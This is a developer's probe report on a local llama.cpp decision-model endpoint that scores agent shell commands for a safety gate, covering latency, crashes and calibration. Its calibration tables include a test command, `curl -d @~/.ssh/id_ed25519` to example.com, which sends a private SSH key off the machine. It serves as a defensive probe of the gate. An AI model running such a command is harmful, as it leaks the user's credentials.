# Endpoint probe — `http://jetson:9931`

Probed live on 2026-10-13 from `/home/fran/code` (`jetson` → `192.168.0.8`).
Raw evidence for SPEC §6.1.
Exchanges are verbatim; benchmark scripts were `python3 urllib` loops, 3–5 reps, interleaved order, medians reported.

**Two models and two llama.cpp builds have been served on this port.**
The contract is identical; the performance, the limits and the readings are not.
As of the last re-probe the port serves **`ggml-org/vllm-d3-flash-GGUF:Q8_0` on llama.cpp `b11606-1b70350c9`**; the `LiquidAI/d1-3B-GGUF:Q8_0` measurements below are from the previous build and are the reason `d1-3B` is still the pick (see "Re-probe: vllm-d3-flash on llama.cpp b11606").
All measurements are labelled with model **and** build, because both move the numbers.

## Service identity

`GET /v1/models` → 200.
Currently: `LiquidAI/d1-3B-GGUF:Q8_0` (`model_path: ~/.cache/huggingface/hub/models--LiquidAI--d1-3B-GGUF/…/d1-3B-Q8_0.gguf`).

Earlier, `vllm-d3-flash` reported `output_modalities: ["decisions"]`, `owned_by: llamacpp`, `n_vocab 248320`, `n_ctx 32768`, `n_params 8.95B`, `ftype Q8_0`.

- Decision-only model, llama.cpp server, `/v1/systemone` per the System One (Jev) format —
  see [ggml-org: Decision models in llama.cpp](https://huggingface.co/blog/ggml-org/decision-models-in-llamacpp).
- **No authentication** (LAN endpoint).
- `GET /health` → 200 `{"status":"ok"}`. `GET /v1/models` doubles as the model-identity check.
  `GET /slots` → per-slot `n_ctx`; `GET /props` → `model_alias`, `total_slots`. `GET /` → 415,
  `GET /version` → 404.
- Server config is observable but not settable over HTTP, and `ssh jetson` needs a key we do not
  have, so llama.cpp flags (`--parallel`, `--batch-size`, `--ubatch-size`, prefix caching) are
  not directly inspectable from here.

## Request contract — `POST /v1/systemone`

```jsonc
{
  "model": "LiquidAI/d1-3B-GGUF:Q8_0",   // ignored when one model is loaded; required in router mode
  "state": { "value": <json>, "context": <json> } // OR a bare string, OR a list of chat messages
  "questions": {
    "<key>": { "type": "noul", "instructions": "…", "criteria": { "true": "…", "false": "…" } }
  },
  "images": ["data:image/png;base64,…"]   // accepted by vision-capable decision models
}
```

Three question types (`type` must be one of `choice`, `score`, `noul`):

| type     | `criteria`                                      | returns                                                            |
| -------- | ----------------------------------------------- | ------------------------------------------------------------------ |
| `noul`   | optional `{true, false}` anchor                 | `{ "noul": p }`                                                    |
| `choice` | **required** object label → description         | `{ "choice", "probabilities": {label: p}, "confidence" }`          |
| `score`  | **required** array of 2–10 levels, lowest first | `{ "score", "legend", "probabilities": {level: p}, "confidence" }` |

Measured `score` answer (d1-3B, "how risky is this call?", levels harmless→catastrophic):

```json
{"type":"score","score":0.319,
 "legend":{"0":"harmless","1":"minor","2":"notable","3":"serious","4":"catastrophic"},
 "probabilities":{"0":0.791,"1":0.144,"2":0.033,"3":0.020,"4":0.012},"confidence":0.734}
```

Question keys **are** echoed in `answers`, so keys can drive wiring; the instruction text still has to stand alone (the model is not told which key it is answering).

Errors (HTTP 400/500):

```json
{"error":{"code":400,"message":"questions.a: \"type\" must be one of: choice, score, noul","type":"invalid_request_error"}}
{"error":{"code":400,"message":"\"state\" must be provided","type":"invalid_request_error"}}
{"error":{"code":500,"message":"input (3843 tokens) is too large to process. increase the physical batch size (current batch size: 512)","type":"server_error"}}
```

## The multi-question question: options are free, questions are not (on this model)

The llama.cpp blog says the model "returns a probability for each option in a single forward pass", and its Tips say: *"Batch your questions.*
*They are answered independently, and **Kev-4B, lev and OpenJev process the state only once.**"* That qualifier is the whole story — state sharing is **per model**, and `LiquidAI/d1-3B` is not in that list.

Measured on d1-3B, `usage.input_tokens` is exactly **`N × (state + question)`**:

```text
state "user asked to fix a failing test; agent proposes: npm test. "
  n=1 → 39 tok    n=2 → 78    n=4 → 156    n=8 → 312    n=12 → 468
state + 15 pads (189 tok)
  n=1 → 189 tok   n=4 → 756 tok
```

And the duplication is **per question, not per option** — options really are near-free:

| questions | options/question | input tokens | tokens/question | latency |
| --------- | ---------------- | ------------ | --------------- | ------- |
| 1         | 2                | 79           | 79              | 0.111 s |
| 1         | 4                | 89           | 89              | 0.111 s |
| 1         | 8                | 109          | 89→109          | 0.122 s |
| 4         | 2                | 316          | 79              | 0.378 s |
| 8         | 2                | 632          | 79              | 0.710 s |

The decisive test is **the same semantic content in two encodings** (the four gate concerns — intent, reversibility, blast radius, credential):

| encoding                           | latency     | input tokens |
| ---------------------------------- | ----------- | ------------ |
| 1 `choice` question with 4 options | **0.209 s** | 218          |
| 4 `noul` questions, same content   | **0.580 s** | 674          |

2.8× the latency and 3.1× the tokens for the same information.
So "a probability for each option in a single forward pass" is exactly right, and it is about **options**: one pass per question, all of that question's options scored inside it.
**Multiple questions are not free on this model; multiple options are.**

So on d1-3B: one forward pass per question, all options of a question scored inside it.
Total tokens are identical whether questions are batched or split into separate requests (674 both ways), which proves there is no prefix reuse in either mode — this is a model/server-path property, not a client bug.

### Latency vs question count (d1-3B, 5 reps, interleaved, medians)

| questions | median  | min–max     |
| --------- | ------- | ----------- |
| 1         | 0.089 s | 0.083–0.092 |
| 2         | 0.163 s | 0.159–0.181 |
| 3         | 0.236 s | 0.233–0.271 |
| 4         | 0.312 s | 0.311–0.325 |
| 6         | 0.460 s | 0.459–0.460 |
| 8         | 0.612 s | 0.609–0.615 |
| 12        | 0.912 s | 0.906–0.914 |

Marginal cost is flat at **~74 ms per extra question** (74–75 ms across n=2…12) with a small state — but that number is only true for a toy 39-token state.
See the next section for the number that matters.

### The real lever is state size, not question count

Marginal cost of going 1 → 4 questions, by state size:

| state size | 1 question | 4 questions | marginal / question |
| ---------- | ---------- | ----------- | ------------------- |
| 39 tok     | 0.087 s    | 0.254 s     | 56 ms               |
| 89 tok     | 0.111 s    | 0.347 s     | 79 ms               |
| 189 tok    | 0.182 s    | 0.487 s     | 102 ms              |
| 339 tok    | 0.307 s    | 0.729 s     | 141 ms              |
| 639 tok    | 0.528 s    | 1.166 s     | 213 ms              |

A realistic gate request — structured state (tool, command, cwd, segments, note, latest user message, two facts) + 4 `noul` questions with anchored criteria — costs **724 tokens and ~0.62 s**.
Against the same state, 1 question costs 173 tokens / 0.179 s, so the marginal cost at realistic state size is **~130 ms per question**, and `input_tokens` works out at **168.5 tokens/question ≈ the state size, per question**.
Practical shape:

| questions                 | 1      | 2       | 4          | 6       | 8      |
| ------------------------- | ------ | ------- | ---------- | ------- | ------ |
| latency (realistic state) | 0.18 s | ~0.37 s | **0.62 s** | ~0.87 s | ~1.1 s |

### Collapsing questions barely helps; collapsing into options does not either

`2 noul + 1 score(5 levels)` = **0.539 s / 587 tok** vs `4 noul` = **0.620 s / 724 tok**.
Only ~0.08 s saved: a question still costs one pass even though its options are free.
Do not shape the question set around latency — shape it around what needs an independent reading.
The `score` question is still worth having, for a different reason: it returned expected level **1.145** with **`confidence 0.046`** and a spread distribution (`0:0.364 1:0.314 2:0.149 3:0.159 4:0.014`).
A flat distribution is a direct "ask the user" signal that `noul` alone does not give.

### Batch, do not fan out per question — and do not try to use the slots

One request with 4 questions: **0.573 s**.
Split across the 2 slots: 2 requests × 2 questions **0.562 s**, 4 requests × 1 question **0.632 s** — identical total tokens, no speedup.
The Jetson is compute-bound; **slots are not extra throughput**.
Earlier with a tiny state 2 parallel looked faster (0.115 s vs 0.090 s), but that does not survive realistic requests.
Send one request.

### Concurrency and limits (d1-3B server)

- `/slots` → **2 slots**, `n_ctx 16384` each.
  But see above: splitting one gate call across the slots produced no speedup, and 4 parallel 1-question requests (0.632 s) were slower than one batched 4-question request (0.573 s).
  Treat the endpoint as **single-throughput**; a client-side semaphore of 1–2 exists only to stop a parallel tool batch stampeding it.
- Input ceiling: **12 039 tokens accepted** (no 500).
  The old server 500'd at ~2 105 tokens with `physical batch size: 512`.
  So the ceiling is a per-server-config number, not a contract constant — measure it at startup rather than hard-coding it.
- **Router mode is off.**
  Sending `"model": "ggml-org/Kev-4B-GGUF"` is silently answered by `LiquidAI/d1-3B-GGUF`.
  A model A/B therefore requires restarting the server, and the gate must check the `model` field in the **response**, never assume it.

### Determinism

5 identical realistic requests produced **1 distinct answer set** (`intent 0.915, reversible 0.903, blast_radius 0.892, credential 0.979`).
Thresholds are meaningful, not noise-wrapped.
Batched vs split mode drifted `reversible` 0.903 → 0.906 — an ordering effect, not randomness.

## Re-probe: `vllm-d3-flash` on llama.cpp b11606 (2026-10-13, later run)

Server restarted on the same port with the same checkpoint (`model_path: ~/.cache/huggingface/hub/models--ggml-org--vllm-d3-flash-GGUF/…/vllm-d3-flash-Q8_0.gguf`), now served by **llama.cpp build `b11606-1b70350c9`** (read from `/props` `build_info`; the checkout in `/home/fran/code/llama.cpp` is at `1b70350c9`, so the source below is the source that ran).
`n_ctx 32768`, **2 slots** (the earlier flash server had 1).
Scripts: `bench/retest_flash.py`, `bench/retest_flash_part2.py`, `bench/envelope_flash.py`, `bench/bisect_crash.py`, `bench/crash_scope.py`.

**Verdict: the multi-question cost is not fixed, and it is not a bug — it is an exclusion in the code.**
`server_decision_context::can_share_prompt()` (`tools/server/server-decision.h:39-52`) lists `OPENJEV, LEV, KEV, NIMBLE, PPLX_DECIDER, VLLM_DECISION2, LFM2_D1` — **`VLLM_D3` is absent**, and `is_joint()` (all questions in one prompt) is `CLEF` only.
So for this model the server never runs `server_decision_group_tasks()` (`server-decision.cpp:1235`), which is the only path that evaluates a shared prefix once.
Measured, unchanged from the old build:

| questions | median (5 reps, interleaved) | min–max     | tok/question |
| --------- | ---------------------------- | ----------- | ------------ |
| 1         | 0.340 s                      | 0.334–0.362 | 104          |
| 2         | 0.657 s                      | 0.649–0.698 | 104          |
| 3         | 0.980 s                      | 0.976–1.015 | 104          |
| 4         | 1.299 s                      | 1.296–1.352 | 104          |
| 6         | 1.944 s                      | 1.941–1.946 | 104          |
| 8         | 2.587 s                      | 2.581–2.604 | 104          |
| 12        | 3.874 s                      | 3.858–3.927 | 104          |

Marginal cost is flat at **317–323 ms per extra question** (every step n=1→12).
Against the old flash build this is **slower, not faster**: base 0.34 s (same), marginal ~280 → ~320 ms, 4 q 1.12 → 1.30 s, 8 q 2.19 → 2.59 s.
`input_tokens` is still exactly `N × (state + question)` (104 tok/question at n=1…12; padded state 1 q 254 tok, 4 q 1016 tok).

Options are still near-free, which is the part that was always true:

| shape                                   | latency     | input tokens |
| --------------------------------------- | ----------- | ------------ |
| 1 `noul`                                | 0.34 s      | 104          |
| 1 `choice`, 2 options                   | 0.424 s     | 118          |
| 1 `choice`, 4 options                   | 0.478 s     | 146          |
| 1 `choice`, 8 options                   | 0.563 s     | 202          |
| same 4 concerns as 1 `choice`×4 options | **0.639 s** | 256          |
| same 4 concerns as 4 `noul`             | **2.287 s** | 818          |

Realistic gate request (`rm -rf build` + note + cwd + segments + user message + 2 facts, 4 `noul` with anchored criteria): **1 q 0.628 s / 212 tok, 2 q 1.111 s / 424 tok, 4 q 2.270 s / 818 tok** (205 tok/question — flash tokenizes this state ~2.4× denser than d1-3B's 724/4).
`2 noul + 1 score(5 levels)` = 1.685 s / 608 tok.
Readings `intent 0.993, reversible 0.972, blast_radius 0.986, credential 1.000`, and **5/5 identical** (determinism is fine).
`score` returned level **1.048** at **confidence 0.253** (`0:0.263 1:0.515 2:0.145 3:0.068 4:0.010`).

Marginal per question by state size: 39 tok state **320 ms**, 154 tok **497 ms**, 254 tok **592 ms**, ≥304 tok **crash** (next section).
So the state-size law is steeper than d1-3B's and it runs into a wall.

### The new thing in this build: the server dies instead of refusing

This is the headline of the re-probe and it is worse than the latency news.
Failure mode changes from a clean HTTP 500 to **the process dying** — connection reset, `/health` refused, model reloaded and serving again **21–33 s later** (something supervises it).

| questions  | largest per-question prompt that survived | first failure                                                                                                                  |
| ---------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| 1          | 504 tok                                   | clean 500 at 604 tok: `input (604 tokens) is too large to process. increase the physical batch size (current batch size: 512)` |
| 2          | 244 tok (pads=14)                         | **CRASH** at 254 tok (pads=15)                                                                                                 |
| 3, 4, 6, 8 | 204–244 tok                               | **CRASH** at ~304 tok, every time                                                                                              |

It is **per-question prompt size, not total tokens**: `12 q × 104 tok/q = 1250 tok total` is fine (3.97 s), while `2 q × 304 tok/q = 608 tok total` crashes.
That fits `n_ubatch = 512` (`common/common.h:457`, "physical batch size"): with ≥2 questions, two prompts land in one ubatch, so the usable per-question budget halves — and the over-limit case crashes instead of erroring.

How reliable is the boundary:

- **well over → deterministic crash**: 3/3 at `4 q × 354 tok/q`, 5/5 across n=2,3,4,6,8 at ~304 tok/q.
- **right at it → coin flip**: at n=1, pads=44 crashed, 46 clean-500, 47 crashed, 48 clean-500;
  `2 q × 254 tok/q` crashed once and the same size at n=4 answered fine.
- **well under → stable**: `4 q × 204 tok/q` 5/5 ok, 2.16–2.25 s.

It is **not decision-specific**: `/v1/chat/completions` crashed at ~1200 prompt tokens (and 600-token chat had worked moments earlier), so this is a server/build/config instability at modest prompt sizes, not a `/v1/systemone` bug.
Repeated crashes degrade it further — after ~10 restarts even ~400-token chat requests were crashing.

Consequences for the gate (feeds SPEC §9/§10 and PLAN Phase 3 risk list):

1. **Hard client-side budget on per-question prompt.**
   With 4 questions keep `state + question ≤ ~200 tok` (measured safe) and treat ~240 tok as the red line.
   That is a *state* budget of roughly **140–175 tokens** once a question with anchored criteria costs ~65 tok.
2. **A conversation window in `state.context` is unaffordable on this server config.**
   The realistic request + a 2-turn window crashed; +4 and +8 turns crashed; +16 turns got the clean 500 at 797 tok.
   This closes PLAN §1.2's first open item with a "no", at least while `n_ubatch` is 512.
3. **Connection-reset must be a first-class failure, and must not be retried blindly.**
   Each crash costs ~24 s of endpoint downtime; a naive retry of an over-large request takes the endpoint down once per tool call.
   Size-check before sending, and open the breaker on transport errors, not only on timeouts.
4. **Startup probe must measure the ceiling** (it is 512-ish here, 12 039 on the d1-3B config) **and
   probe it with a throwaway multi-question request**, because the multi-question limit is lower
   than the single-question one.

### Readings moved between builds — calibration is build-dependent too

Same model file, same prompt text, different llama.cpp.
The middle band is not where it was:

| call                                                 | old flash build                 | b11606                                          |
| ---------------------------------------------------- | ------------------------------- | ----------------------------------------------- |
| `rm -rf build`, no criteria                          | 0.073                           | 0.065                                           |
| `rm -rf build`, loose criteria                       | 0.154                           | **0.016**                                       |
| `rm -rf build` + note, anchored criteria             | 0.977                           | 0.987                                           |
| `rm -rf build`, `choice` safe/moderate/dangerous     | **dangerous 0.634**, conf 0.268 | **moderate 0.548**, dangerous 0.306, safe 0.147 |
| `git status && npm test` reversible / authorized     | 0.805 / 0.542                   | **0.965 / 0.887**                               |
| `curl -d @~/.ssh/id_ed25519` credential / authorized | 0.007 / 0.060                   | 0.005 / 0.034                                   |
| 12 generic "is condition N satisfied"                | all **0.37–0.51**               | all **0.13–0.24**                               |

The last row matters most: "vague instructions return ~0.5, i.e. the middle band" was a property of the old build, not of the question style.
Thresholds must therefore be pinned to **model + quantization + llama.cpp build**, and the gate should log `build_info` from `/props` alongside the model name.

### Slots, again

2 slots now, still no throughput win.
Questions inside one request are serialized (n=2 at 0.657 s ≈ 2 × 0.34 s).
Separate parallel requests *do* overlap two at a time (4 × 1 q → wall 1.29 s, per-request 0.62/1.29/0.62/1.29; 8 × 1 q → wall 2.52 s vs one batched 8-q request 2.55 s).
Fan-out is not a workaround for the crash either — the per-question prompt is the same size either way (it only helps at the flaky boundary, where 2 × 1 q at 254 tok/q survived while 1 × 2 q crashed).

## Code review at b11606 — and what `b11577` "fix vllm d3 multi seq case" actually does

Source read at `1b70350c9` (= the running build, from `/props` `build_info`), cross-checked against `/home/fran/code/llama.cpp` at `5e22c48f6`.

**Why multi-question cost is linear for this model.**
`server_decision_context::can_share_prompt()` (`tools/server/server-decision.h:39-52`) lists `OPENJEV, LEV, KEV, NIMBLE, PPLX_DECIDER, VLLM_DECISION2, LFM2_D1` — **`VLLM_D3` is absent**; `is_joint()` (all questions in one prompt) is `CLEF` only.
So the server never runs `server_decision_group_tasks()` (`server-decision.cpp:1235`), the only path that evaluates a shared prefix once.
Each question becomes its own task with its own copy of the state (`server-decision.cpp:1119-1136`), and `parse_state` re-serializes the state per task (`:1123`).
That is the whole explanation for `input_tokens = N × (state + question)`.
`d1-3B` is `LFM2_D1`, which **is** in the list — so the state-sharing lever exists for the current pick, it just needs `--parallel >= n_questions` (the probed server ran 1 slot).

**`b11577` (`cbe28bb3c`, "model: fix vllm d3 multi seq case", #30408, 2026-10-13) is already in the build that ran the re-probe** — verified with `git merge-base --is-ancestor cbe28bb3c 1b70350c9` → yes.
It is a **correctness** fix, not a latency fix:

- `llama-context.cpp`: `embd_all = output_all || !cparams.causal_attn` — non-causal attention
  needs the whole sequence in one ubatch.
- `llama-kv-cache.cpp` / `llama-kv-cache-iswa.cpp`: `init_batch` now uses
  `balloc.split_seq(n_ubatch)` instead of `split_equal` / `split_simple` when `embd_all`.
- `split_seq` (`llama-batch.cpp`) emits **one sequence-set per ubatch**, capped at `n_ubatch`
  (default 512, `common.h:457`), and `llama-batch.h` carries
  `// TODO: extend to support multiple _full_ sequences in the ubatch`.
- d3 is non-causal: `common.h:967` `COMMON_DECISION_TYPE_VLLM_D3, // same as pplx-decider,
  non-causal attention`; the flag comes from the GGUF key `attention.causal`
  (`llama-model.cpp:1369`).

Three consequences:

1. It does **not** remove the per-question cost — that is the `can_share_prompt()` exclusion
   above, untouched by `b11577`.
2. It explains the **shape of the crash envelope**: with `split_seq` a single sequence must fit
   in one ubatch, which matches the clean 500 at 604 tok for 1 question (`n_ubatch = 512`),
   while multi-sequence decision batches are exactly the case the TODO says is unfinished —
   matching the process death at >= 2 questions x >= 254 tok/question.
3. It is the **leading explanation for the calibration drift** between the two flash runs: the 12-generic-questions row is a multi-sequence batch, and it moved from 0.37-0.51 s with readings 0.00-0.99 to 0.13-0.24 s with readings 0.00-0.13.
   Single-question rows barely moved.

The test for (3) is `bench/probe.py --only multiseq`: same questions asked alone, in pairs, and batched x4, plus the same question repeated under different keys at n=1/2/4/8.
If batched readings drift from alone readings, thresholds must be calibrated in the batch shape the gate actually ships.

**`d3-mini` metadata (read locally from the GGUF the user downloaded, before serving):** architecture `qwen35`, name `vllm-d3-mini`, size label `4.8B`, 427 tensors, GGUF v3.
The Hub repo also ships `mmproj-vllm-d3-mini-{BF16,Q8_0}.gguf` and is tagged `image-text-to-text`, so expect the decision endpoint to reject images until served with `--mmproj` (`format_error_response("This server does not support image input for decisions…")`).

## The crash, explained: the `n_ubatch` assert (2026-10-14, from the server log)

The b11606 crash was a **hard assert**, not a resource failure.
From the live log on `b11627`:

```text
src/llama-context.cpp:1898: GGML_ASSERT((cparams.causal_attn || cparams.n_ubatch >= n_tokens_all))
    && "non-causal attention requires n_ubatch >= n_tokens") failed
```

It is conditional on **non-causal attention**, so it only applies to the d3 family (`common.h:967` `COMMON_DECISION_TYPE_VLLM_D3, // same as pplx-decider, non-causal attention`).
`d1-3B` (`LFM2_D1`) is causal and can never hit it.

**Why it looked erratic — which questions get merged.**
`server_slot::can_batch_with` (`tools/server/server-context.cpp:477-487`) merges two `SERVER_TASK_TYPE_DECISION` tasks into one slot batch only when `inp_embd.size()` is **equal** (same task type, same LoRA).
Therefore:

| prompt lengths                      | path                                                            | outcome                          |
| ----------------------------------- | --------------------------------------------------------------- | -------------------------------- |
| equal, merged total > `n_ubatch`    | allocation succeeds (each sequence fits), then the assert fires | **process dies**                 |
| equal, single sequence > `n_ubatch` | `split_seq` cannot fit it, allocation refuses                   | clean HTTP 500 naming `n_ubatch` |
| unequal lengths                     | never merged, one sequence per decode                           | fine at any total we tested      |

That is why the toy/generic probes (identical question lengths) died while the realistic 4-question request at 821 tokens total ran fine.
Measured on `d3-mini` at the default config: single sequence ok at 504 tok, clean 500 at 544 tok reporting **`current batch size: 512`** (`-ub/--ubatch-size`, default `n_ubatch = 512` in `common/common.h:457`; logical `-b/--batch-size` default 2048 in `common.h:456`).

**Consequence for the gate:** at `-ub 512` the merged total must stay <= 512 tokens, and whether questions merge depends on them having equal prompt length — not something the client can rely on.
Either raise `-ub` (>= the largest total we would ever merge; our realistic 4-question request is 821 tok, ~1200-2000 with a conversation window) or run `--parallel 1` for non-causal models, which removes the merge opportunity entirely and turns the crash into a clean 500.

## `--parallel` is the state-sharing switch, not a throughput knob

`server_decision_group_tasks(tasks, params.n_parallel)` (`server-context.cpp:5810-5812`, `server-decision.cpp`) chunks the per-question tasks into groups of `n_parallel`, computes each group's common token prefix (`get_common_prefix`, capped so the parent keeps one token of its own) and folds it into one parent task with `n_tokens_shared` + `child_tasks`.
With `--parallel 1` the chunk size is 1, `end - i < 2`, and **no grouping happens — no sharing**.

So the earlier `d1-3B` result (`input_tokens = N x (state + question)`) was not a property of the model: that server ran 1 slot, which is the one configuration where `can_share_prompt()` cannot fire.
`--parallel 4` is the experiment: expect the realistic 4-question request to drop from 821 tokens toward ~212 + 3 x (question-only tokens), with latency following.

For the d3 family the same knob is the *cause* of the assert (it creates the merged multi-sequence batch), and it bought no throughput here: 4 parallel 1-question requests took 1.418 s wall vs 1.409 s for one 4-question request, with per-request times of 0.72/1.415 s showing queueing rather than parallel execution.

## Sharing measured on `d1-3B` at `--parallel 2` (2026-10-14): it fires, and `usage` cannot see it

`bench/probe.py --only slot_counters` polls `/slots` while a request is in flight and keys the samples by `(slot, id_task)`.
`/slots` exposes `n_prompt_tokens` (what the slot holds), `n_prompt_tokens_processed` (what it computed, `server-context.cpp:3937`) and `n_prompt_tokens_cache` (the prefix it inherited rather than computed, set at `:3814` and capped at `n_tokens_shared` for a child at `:3607-3609`).
Shared state ~441 tok, question tail ~200 tok, 3 reps, best rep kept (`results/20261014-134211-d1-3b-p2-slots.md`):

| questions | slot-tasks seen | of which inherited the prefix              | real compute (prompt − inherited) | `usage.input_tokens` |
| --------- | --------------- | ------------------------------------------ | --------------------------------- | -------------------- |
| 1         | 1               | 0                                          | 657                               | 657                  |
| 2         | 2               | 1                                          | 873                               | 1314                 |
| 4         | 4               | 1 (sampling; the pair pattern is the same) | 1968                              | 2624                 |
| 8         | 8               | **4**                                      | 3492                              | 5256                 |

At `--parallel 2` the group size is 2, so exactly `ceil(n/2)` parents compute the state and the other half of the tasks inherit it — the mechanism is confirmed, and the ceiling on the saving is set by `n_parallel`, not by the model.

**Corrections to the paragraph above:**

- `usage.input_tokens` will **not** drop at `--parallel 4`.
  It is `sum(slot.task->n_tokens())` over the per-question results (`server-context.cpp:2345`, `:5840-5843`), shared prefix or not.
  The earlier expectation ("expect the realistic 4-question request to drop from 821 tokens toward ~212 + 3 x question-only tokens") is wrong: only **latency** and the server's own compute drop.
  Any client-side token budget/cost model built on `usage.input_tokens` overstates compute whenever `--parallel >= n_questions`.
- The tell is `slot_counters` (direct) or the `sharing` case's `factor L4/L1` (indirect).
  At `--parallel 2` that factor saturates at ~`ceil(n/n_slots)` whether sharing fires or not, so the decisive run is **`--parallel 4` with n=4**: one group, one state read.
  Predicted there: `slot_counters` shows 3/4 tasks inheriting, and the 4-question latency falls toward a single question's (~0.42 s at a 441-tok state instead of ~0.85 s).

## `d1-3B` envelope and conversation window (2026-10-14, `--parallel 2`)

`--only envelope` on `d1-3B` (`results/20261014-131110-d1-3b-p2-env.md`): **no crashes at all**.
OK up to the largest size probed at every question count — 639 tok/question at n=1, n=2 and n=4 (2 556 tok total at n=4) — consistent with the assert being conditional on non-causal attention (`llama-context.cpp:1898`), which `d1-3B` does not have.
One latency outlier (2.58 s at n=2, 439 tok/q) with no crash around it.

The conversation-window question (PLAN §1.2 item 5) is answered for `d1-3B`: a real window in `state.context` with the gate's 4 questions runs clean at 2, 4 and 8 turns (1 035 / 1 315 / 1 875 tok) and the readings barely move — intent 0.915 → 0.872 / 0.899 / 0.907, reversible 0.906 → 0.903 / 0.901 / 0.894.
So the gate can send the window, not a summary, on this model; the cost is ~140 tok/turn and ~0.16 s/turn.
On `vllm-d3-flash` the same request crashed the process at 2 turns — that constraint is model+build specific, not a property of the endpoint.

## Model comparison — same host, same port

|                                               | `vllm-d3-flash` 8.95B Q8 (old build)                    | `vllm-d3-flash` 8.95B Q8, **b11606**                                                              | `LiquidAI/d1-3B` 3B Q8 (current pick)                     |
| --------------------------------------------- | ------------------------------------------------------- | ------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| base latency (1 question, toy 39-token state) | 0.34 s                                                  | 0.34 s                                                                                            | **0.09 s**                                                |
| marginal per extra question (toy state)       | ~280 ms                                                 | ~320 ms                                                                                           | **~74 ms**                                                |
| marginal per extra question (realistic state) | —                                                       | 592 ms at a 254-tok state                                                                         | **~130 ms**                                               |
| 4 questions (toy state)                       | 1.12 s                                                  | 1.30 s                                                                                            | **0.31 s**                                                |
| 8 questions (toy state)                       | 2.19 s                                                  | 2.59 s                                                                                            | **0.61 s**                                                |
| realistic 4-question request                  | —                                                       | **2.27 s / 818 tok**                                                                              | **0.62 s / 724 tok**                                      |
| tokens per question (same text)               | 105                                                     | 205 (realistic)                                                                                   | 39 (toy) / 168 (realistic)                                |
| input ceiling                                 | 500 at ~2 105 tok (batch 512)                           | clean 500 at 604 tok for 1 q; **hard crash** at ~254 tok/q with ≥2 q                              | OK at 12 039 tok                                          |
| slots / concurrency                           | 1, strictly serialized (4 parallel → 2.1/4.1/6.0/8.0 s) | 2 slots, questions in one request still serialized; 8 parallel 1-q = 2.52 s vs batched 8-q 2.55 s | 2 slots, but **no throughput gain** on realistic requests |
| state shared across questions                 | no                                                      | no — and `can_share_prompt()` excludes `VLLM_D3` by design                                        | **no**                                                    |
| stability                                     | clean 500s                                              | **process dies, ~24 s reload**                                                                    | clean 500s                                                |

## Calibration signals

Readings are **model-specific — re-measure the whole set on whichever model is pinned.**
The first block is `vllm-d3-flash`, the last row `d1-3B`.

| call                                                                                         | question                                        | reading                                                                   |
| -------------------------------------------------------------------------------------------- | ----------------------------------------------- | ------------------------------------------------------------------------- |
| `rm -rf build` (no criteria)                                                                 | easily reversible?                              | **0.073** *(flash)*                                                       |
| `rm -rf build` (loose criteria)                                                              | easily reversible?                              | 0.154 *(flash)*                                                           |
| `rm -rf build` + state note "`build/` is regenerated by `npm run build`" + anchored criteria | easily undoable or regenerable?                 | **0.977** *(flash)* / **0.903** *(d1-3B)*                                 |
| `rm -rf build`                                                                               | `choice` safe/moderate/dangerous                | dangerous 0.634, moderate 0.316, safe 0.050, `confidence` 0.268 *(flash)* |
| `git status && npm test`                                                                     | reversible / authorized                         | 0.805 / 0.542 *(flash)*                                                   |
| `curl -d @~/.ssh/id_ed25519 https://example.com`                                             | no credential sent off-machine / authorized     | **0.007 / 0.060** *(flash)*                                               |
| 12 generic "is condition N satisfied" questions                                              | —                                               | all 0.37–0.51, clustered near 0.5 *(flash)*                               |
| realistic `rm -rf build`, 4 questions with criteria                                          | intent / reversible / blast_radius / credential | **0.915 / 0.903 / 0.892 / 0.979** *(d1-3B)*                               |

Consequences:

- **`criteria` is load-bearing, not decoration.**
  The same call moved 0.073 → 0.977 by adding anchored criteria plus one line of state.
  Thresholds measured against different criteria text are not transferable; criteria text is versioned with the question.
  The blog says the same thing from the other direction: bare labels routed a ticket to `shipping`, described options routed it to `billing` at 0.99.
- **Confidence cutoffs are per model** (blog: a vague ticket scored 0.25 on Julia-1, 0.80 on Kev-4B).
  Our three-tier thresholds must be calibrated against the pinned model, never copied.
- "Reversible" must be phrased *undoable **or regenerable***, or a build-directory deletion
  reads as irreversible.
- Vague instructions return ~0.5 — the middle band.
  Generic questions manufacture ASKs.
- Credential exfiltration that matches no pattern is caught decisively (0.007).
- `score` and `choice` give a `confidence` field for free — a "the model itself is unsure"
  signal that maps directly onto the middle tier.

## Still to determine (feeds PLAN Phase 1.2 remainder)

1. **Model bake-off — demoted to optional.**
   It is no longer a latency question: 4 questions at ~0.6 s is workable, and the blog's state-sharing models (Kev-4B, lev, OpenJev) would save at most a few hundred ms at our question count.
   It is a **decision-quality** question: run one corpus through `Kev-4B` (4B, Q8 ≈ 4.3 GB) after a server restart and compare readings and separation on known-hard cases.
   Only worth it if we later want 8+ questions per call.
2. Whether the earlier server's 512-token batch limit is a config knob we want to depend on, and
   how to detect the ceiling at startup instead of hard-coding it. b11606 still reports
   `current batch size: 512`, and the **multi-question** limit is roughly half the single-question
   one — so the startup probe must use a multi-question request, and must be prepared for the probe
   itself to crash the endpoint (transport error ≠ "ceiling is higher").
3. Whether `choice`/`score` can be mixed with `noul` in one request — **yes in practice** (the
   `2 noul + 1 score` request worked), but confirm whether mixing changes any reading.
4. How to use `confidence` from `score`/`choice` in the tier table: is a low-confidence severity
   reading enough on its own to force ASK?
5. Does a real conversation window in `state.context` degrade other readings, or just cost tokens?
   **Answered for both models.**
   On `vllm-d3-flash`/b11606 it kills the server (2-turn window crashed the process; +16 turns got a clean 500 at 797 tok).
   On `d1-3B` it is fine: 2/4/8 turns run clean and the readings move by <= 0.04 (see the envelope section).
   So the gate ships the window on `d1-3B` and a summary on any non-causal model until that one's envelope is re-measured.
6. Cold start after server restart; prompt-cache behaviour across *similar* (not identical) calls.
7. Which model to pin, and re-verifying it at startup from the **response** `model` field, since the server ignores the requested model when one is loaded.
   **Add `build_info` from `/props` to that check**: the same checkpoint on b11606 moved the 12-generic-question readings from 0.37–0.51 to 0.13–0.24 and flipped the `rm -rf build` `choice` answer from `dangerous` to `moderate`, so thresholds are pinned to model + quantization + build, not model alone.
8. **New, from the b11606 re-probe:** is the crash at ~250 tok/question with ≥2 questions a llama.cpp bug to report upstream (it also takes down `/v1/chat/completions` at ~1 200 tokens), or a Jetson backend/config artifact?
   It decides whether `vllm-d3-flash` is usable here at all, and it is the reason `d1-3B` stays the pick.
